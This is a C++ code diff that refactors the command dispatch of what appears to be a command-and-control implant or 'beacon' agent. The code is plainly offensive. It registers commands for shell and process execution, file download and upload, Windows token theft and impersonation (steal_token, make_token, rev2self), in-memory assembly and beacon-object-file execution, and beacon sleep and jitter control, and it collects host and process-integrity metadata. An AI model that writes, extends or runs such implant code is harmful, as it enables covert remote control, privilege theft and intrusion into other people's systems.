@@ -14,22 +14,39 @@ Agent::Agent()
 	Metadata = generateMetadata();
 }
 
-std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Agent::loadCommands() {
-	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> commands;
+std::unordered_map<std::string, std::function<std::string(const Task&)>> Agent::loadCommands() {
+	std::unordered_map<std::string, std::function<std::string(const Task&)>> commands;
 
-	commands["whoami"] = &whoami;
-	commands["shell"] = &shell;
-	commands["run"] = &run;
-	commands["pwd"] = &pwd;
-	commands["cd"] = &Cd;
-	commands["ls"] = &Ls;
-	commands["download"]    = &Download;
-	commands["make_token"]  = &MakeToken;
-	commands["steal_token"] = &StealToken;
-	commands["rev2self"]    = &Rev2Self;
+	commands["whoami"]      = [](const Task& t) { return whoami(t.arguments); };
+	commands["shell"]       = [](const Task& t) { return shell(t.arguments); };
+	commands["run"]         = [](const Task& t) { return run(t.arguments); };
+	commands["pwd"]         = [](const Task& t) { return pwd(t.arguments); };
+	commands["cd"]          = [](const Task& t) { return Cd(t.arguments); };
+	commands["ls"]          = [](const Task& t) { return Ls(t.arguments); };
+	commands["download"]    = [](const Task& t) { return Download(t.arguments); };
+	commands["make_token"]  = [](const Task& t) { return MakeToken(t.arguments); };
+	commands["steal_token"] = [](const Task& t) { return StealToken(t.arguments); };
+	commands["rev2self"]    = [](const Task& t) { return Rev2Self(t.arguments); };
+	commands["upload"]      = [](const Task& t) { return Upload(t.arguments, t.file); };
+	commands["inline-assembly"] = [](const Task& t) { return InlineAssembly(t.arguments, t.file); };
+	commands["bof"]         = [](const Task& t) { return RunBOF(t.arguments, t.file, t.file2); };
+	commands["set_sleep"]   = [this](const Task& t) -> std::string {
+		if (t.arguments.size() < 2)
+			return "Error: usage: set_sleep <interval_ms> <jitter_ms>";
+		try {
+			DWORD interval = static_cast<DWORD>(std::stoul(t.arguments[0]));
+			DWORD jitter   = static_cast<DWORD>(std::stoul(t.arguments[1]));
+			setBeaconIntervalMs(interval);
+			setBeaconJitterMs(jitter);
+			return "Sleep set to " + std::to_string(interval) + " ms +/- " + std::to_string(jitter) + " ms";
+		} catch (...) {
+			return "Error: interval and jitter must be positive integers";
+		}
+	};
 
 	return commands;
 }
+
 AgentMetadata Agent::generateMetadata() {
 	std::mt19937 rng(
 		static_cast<unsigned int>(
@@ -38,11 +55,11 @@ AgentMetadata Agent::generateMetadata() {
 	);
 	std::uniform_int_distribution<int> dist(1000, 9999);
 
-	std::vector<std::string> arguments;
+	Task emptyTask{};
 	AgentMetadata metadata = {
 		dist(rng),
 		GetHostname(),
-		Commands["whoami"](arguments),
+		Commands["whoami"](emptyTask),
 		GetProcessname(),
 		static_cast<int>(GetCurrentProcessId()),
 		GetProcessIntegrityLevel(),
@@ -86,42 +103,16 @@ std::vector<TaskResult> Agent::getTaskResults() {
 void Agent::executeTask(Task& task) {
 	std::cout << "Executing task: " << task.id << std::endl;
 
-	//Execute Command
 	std::string command_output;
-	if (task.command == "upload") {
-		command_output = Upload(task.arguments, task.file);
-	}
-	else if (task.command == "inline-assembly") {
-		command_output = InlineAssembly(task.arguments, task.file);
-	}
-	else if (task.command == "bof") {
-		command_output = RunBOF(task.arguments, task.file);
-	}
-	else if (task.command == "set_sleep") {
-		if (task.arguments.size() < 2) {
-			command_output = "Error: usage: set_sleep <interval_ms> <jitter_ms>";
-		} else {
-			try {
-				DWORD interval = static_cast<DWORD>(std::stoul(task.arguments[0]));
-				DWORD jitter   = static_cast<DWORD>(std::stoul(task.arguments[1]));
-				setBeaconIntervalMs(interval);
-				setBeaconJitterMs(jitter);
-				command_output = "Sleep set to " + std::to_string(interval) + " ms +/- " + std::to_string(jitter) + " ms";
-			} catch (...) {
-				command_output = "Error: interval and jitter must be positive integers";
-			}
-		}
-	}
-	else if (Agent::Commands.find(task.command) != Agent::Commands.end()) {
-		command_output = Commands[task.command](task.arguments);
-	}
-	else {
+	auto it = Commands.find(task.command);
+	if (it != Commands.end()) {
+		command_output = it->second(task);
+	} else {
 		command_output = "Comando no encontrado";
 	}
-	
+
 	std::cout << "Commands Output: " << command_output << std::endl;
 	TaskResult result = { task.id, command_output };
-
 	Agent::addResult(result);
 }
 
@@ -131,9 +122,8 @@ void Agent::Work() {
 		if (!Tasks.empty()) {
 			Task task = Agent::getNextTask();
 			Agent::executeTask(task);
-			
+
 		}
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 	}
 }
-
